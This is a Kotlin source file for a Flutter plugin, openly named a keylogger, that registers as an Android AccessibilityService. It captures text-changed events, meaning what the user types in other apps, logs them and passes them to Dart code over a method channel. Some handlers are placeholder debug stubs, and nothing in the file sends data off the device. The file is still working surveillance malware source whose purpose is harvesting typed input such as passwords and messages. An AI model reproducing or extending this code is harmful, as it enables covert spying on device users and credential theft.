package youtube.sidtube.keylogger

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import io.flutter.embedding.engine.plugins.FlutterPlugin
import io.flutter.embedding.engine.plugins.FlutterPlugin.FlutterPluginBinding
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.MethodChannel.MethodCallHandler
import io.flutter.plugin.common.PluginRegistry.Registrar
import java.util.*

class KeyloggerPlugin : AccessibilityService(), FlutterPlugin, MethodCallHandler {
    var datas: MutableMap<String, String> = HashMap()
    var methodChannel: MethodChannel? = null
    override fun onAttachedToEngine(flutterPluginBinding: FlutterPluginBinding) {
        methodChannel = MethodChannel(flutterPluginBinding.flutterEngine.dartExecutor, "keylogger")
        methodChannel!!.setMethodCallHandler(this)
    }

    override fun onDetachedFromEngine(binding: FlutterPluginBinding) {
        methodChannel!!.setMethodCallHandler(null)
    }

    override fun onMethodCall(call: MethodCall, result: MethodChannel.Result) {
        if (call.method.contains("test")) {
            Log.d("aa", "aaaaaaaaaaaa")
        }
        if (call.method.contains("aaa")) {
            result.success("aa")
        }
    }

    public override fun onServiceConnected() {
        Log.d("Keylogger", "Starting service")
    }

    fun sendData(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                datas["log"] = data
                datas["type"] = "text"
                Log.d("Keylogger", datas.toString())
                //                l.data(datas);
                methodChannel!!.invokeMethod("test", datas)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
            }
            else -> {
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        sendData(event)
    }

    override fun onInterrupt() {}

    companion object {
        fun registerWith(registrar: Registrar) {
            val channel = MethodChannel(registrar.messenger(), "keylogger")
            channel.setMethodCallHandler(KeyloggerPlugin())
        }
    }
}